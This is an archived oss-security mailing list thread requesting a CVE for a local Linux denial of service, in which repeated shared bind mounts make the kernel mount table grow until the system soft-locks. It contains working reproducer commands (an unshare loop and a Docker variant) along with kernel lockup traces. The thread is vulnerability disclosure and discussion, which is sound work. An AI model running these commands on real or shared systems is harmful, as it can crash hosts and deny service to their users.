  oss-security - Re: Re: cve request: local DoS by overflowing kernel  mount table using shared bind mount            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Fri, 15 Jul (EDT) From: CAI Qian <caiqian@...hat.com> To: oss-security@...ts.openwall.com Subject: Re: Re: cve request: local DoS by overflowing kernel  mount table using shared bind mount  Also, it is exploitable without docker but with only user namespace enabled.  $ unshare -r -m --propagation shared # for i in `seq 1 30`; do mount -o bind ~/src/ ~/des/; done  Tested it on this large memory machine. consumed 1.5G memory to create entries in the mount table. Immediately afterwards, NMI watchdog/soft-lockup kicked in and the kernel is dead.    CAI Qian  $ unshare -m -r --propagation shared # for i in `seq 1 30`; do mount -o bind ~/src/ ~/des/; free -m; mount | wc -l ; done               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0        34               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0        36               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0        40               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0        48               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0        64               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0        96               total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8              Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8             Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                                8             Swap:                    0                      total        used        free      shared  buff/cache   available Mem:                               8             Swap:                    0         Message from at Jul 14 ...  kernel:NMI watchdog: BUG: soft lockup - CPU#12 stuck for 23s!  Message from at Jul 14 ...  kernel:NMI watchdog: BUG: soft lockup - CPU#0 stuck for 22s!  Message from at Jul 14 ...  kernel:NMI watchdog: BUG: soft lockup - CPU#3 stuck for 23s!               total        used        free      shared  buff/cache   available Mem:                               8             Swap:                    0         Message from at Jul 14 ...  kernel:NMI watchdog: BUG: soft lockup - CPU#4 stuck for 23s!  Message from at Jul 14 ...  kernel:NMI watchdog: BUG: soft lockup - CPU#14 stuck for 22s!  [ NMI watchdog: BUG: soft lockup - CPU#12 stuck for 23s! [ Modules linked in: ipmi_ssif nfsd kvm_amd kvm auth_rpcgss nfs_acl ses lockd enclosure ipmi_devintf scsi_transport_sas irqbypass ipmi_si ibmpex ibmaem sg shpchp ipmi_msghandler i2c_piix4 k10temp pcspkr acpi_cpufreq grace sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom radeon i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt ata_generic fb_sys_fops ixgbe pata_acpi ttm lpfc drm mdio pata_serverworks dca aacraid libata ptp serio_raw bnx2 scsi_transport_fc pps_core i2c_core dm_mirror dm_region_hash dm_log dm_mod [ CPU: 12 PID: Comm: mount Not tainted #1 [ Hardware name: IBM IBM System Planar, BIOS IBM BIOS Version [ task: ti: task.ti: [ RIP:  [ RSP:  EFLAGS: [ RAX: RBX: RCX: [ RDX: RSI: RDI: [ RBP: R08: R09: [ R10: R11: R12: [ R13: R14: R15: [ FS:  [ CS:  DS: ES: CR0: [ CR2: CR3: CR4: [ Stack: [  [  [  [ Call Trace: [  [  [  [  [  ? [  ? [  ? [  [  [  [ Code: b2 00 48 8b 15 12 2e b2 00 48 8d 04 c2 48 8b 10 31 c0 48 85 d2 75 10 5d c3 48 39 72 18 74 21 48 8b 12 48 85 d2 74 15 48 8b 42 10 <48> 83 c0 20 48 39 c7 74 e5 48 8b 12 48 85 d2 75 eb 31 c0 5d c3  [ NMI watchdog: BUG: soft lockup - CPU#0 stuck for 22s! [ Modules linked in: ipmi_ssif nfsd kvm_amd kvm auth_rpcgss nfs_acl ses lockd enclosure ipmi_devintf scsi_transport_sas irqbypass ipmi_si ibmpex ibmaem sg shpchp ipmi_msghandler i2c_piix4 k10temp pcspkr acpi_cpufreq grace sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom radeon i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt ata_generic fb_sys_fops ixgbe pata_acpi ttm lpfc drm mdio pata_serverworks dca aacraid libata ptp serio_raw bnx2 scsi_transport_fc pps_core i2c_core dm_mirror dm_region_hash dm_log dm_mod [ CPU: 0 PID: Comm: NetworkManager Tainted: G             L  #1 [ Hardware name: IBM IBM System Planar, BIOS IBM BIOS Version [ task: ti: task.ti: [ RIP:  [ RSP:  EFLAGS: [ RAX: RBX: RCX: [ RDX: RSI: RDI: [ RBP: R08: R09: [ R10: R11: R12: [ R13: R14: R15: [ FS:  [ CS:  DS: ES: CR0: [ CR2: CR3: CR4: [ Stack: [  [  [  [ Call Trace: [  [  ? [ NMI watchdog: BUG: soft lockup - CPU#3 stuck for 23s! [ Modules linked in: ipmi_ssif nfsd kvm_amd kvm auth_rpcgss nfs_acl ses lockd enclosure ipmi_devintf scsi_transport_sas irqbypass ipmi_si ibmpex ibmaem sg shpchp ipmi_msghandler i2c_piix4 k10temp pcspkr acpi_cpufreq grace sunrpc ip_tables xfs libcrc32c sd_mod sr_mod cdrom radeon i2c_algo_bit drm_kms_helper syscopyarea sysfillrect sysimgblt ata_generic fb_sys_fops ixgbe pata_acpi ttm lpfc drm mdio pata_serverworks dca aacraid libata ptp serio_raw bnx2 scsi_transport_fc pps_core i2c_core dm_mirror dm_region_hash dm_log dm_mod [ CPU: 3 PID: Comm: systemd-journal Tainted: G             L  #1 [ Hardware name: IBM IBM System Planar, BIOS IBM BIOS Version [ task: ti: task.ti: [ RIP:  [ RSP:  EFLAGS: [ RAX: RBX: RCX: [ RDX: RSI: RDI: [ RBP: R08: R09: [ R10: R11: R12: [ R13: R14: R15: [ FS:  [ CS:  DS: ES: CR0: [ CR2: CR3: CR4: [ Stack: [  [  [  [ Call Trace: [  ? [  [  [  ? [  ? [  ? [  ? [  [  [  ? [  [  [  [  ? [  ? [  ? [  ? [  ? [  ? [  [  SyS_sendmsg+0  ----- Original Message ----- > From: "CAI Qian" <caiqian@...hat.com> > To: "Greg KH" <greg@...ah.com> > Cc: oss-security@...ts.openwall.com, cve-assign@...re.org > Sent: Thursday, July 14, PM > Subject: Re: [oss-security] Re: cve request: local DoS by overflowing kernel mount table using shared bind mount >  > Maybe this is a better reproducer using docker. It is exploitable even with > user namespace enabled. >  > # docker run -it -v /mnt/:/mnt/:shared --cap-add=SYS_ADMIN rhel7 /bin/bash >  > # cat /proc/self/uid_map >          0             >  > # cat /proc/self/gid_map >          0             >  > (insider container) # for i in `seq 1 20`; mount -o bind /mnt/1 /mnt/2; done >    CAI Qian >  > ----- Original Message ----- > > From: "Greg KH" <greg@...ah.com> > > To: oss-security@...ts.openwall.com > > Cc: caiqian@...hat.com, cve-assign@...re.org > > Sent: Wednesday, July 13, PM > > Subject: Re: [oss-security] Re: cve request: local DoS by overflowing > > kernel mount table using shared bind mount > >  > > On Wed, Jul 13, at cve-assign@...re.org wrote: > > > > It was reported that the mount table expands by a power-of-two > > > > with each bind mount command. > > >  > > > > If the system is configured in the way that a non-root user > > > > allows bind mount even if with limit number of bind mount > > > > allowed, a non-root user could cause a local DoS by quickly > > > > overflow the mount table. > > >  > > > > it will cause a deadlock for the whole system, > > >  > > > >> form of unlimited memory consumption that is causing the problem > > >  > > > Use > >  > > A CVE for an "improperly configured system"?  Huh?  What distro has such > > a configuration set by default?  This isn't a kernel bug, so what is > > this CVE classified as being "against"?  It better not be against the > > Linux kernel... > >  > > confused, > >  > > greg k-h > >  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      